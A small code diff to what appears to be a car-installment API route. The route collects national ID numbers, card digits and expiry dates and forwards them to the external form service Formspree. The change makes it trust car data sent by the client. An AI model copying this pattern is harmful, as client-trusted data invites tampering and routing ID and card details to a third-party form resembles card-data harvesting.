@@ -4,10 +4,10 @@ import { cars } from "@/lib/data"
 export async function POST(request: Request) {
   try {
     const body = await request.json()
-    const { fullName, nin, cardLast8, cardExpiry, phone1, phone2, hasPreviousInstallment, selectedCarId, createdAt } = body
+    const { fullName, nin, cardLast8, cardExpiry, phone1, phone2, hasPreviousInstallment, selectedCarId, selectedCar: carFromBody, createdAt } = body
 
-    // Find the selected car
-    const selectedCar = cars.find((car) => car.id === selectedCarId)
+    // Use car from body or find by ID
+    const selectedCar = carFromBody || cars.find((car) => car.id === selectedCarId)
 
     // Format message for Formspree (completely free, no setup needed)
     const message = `
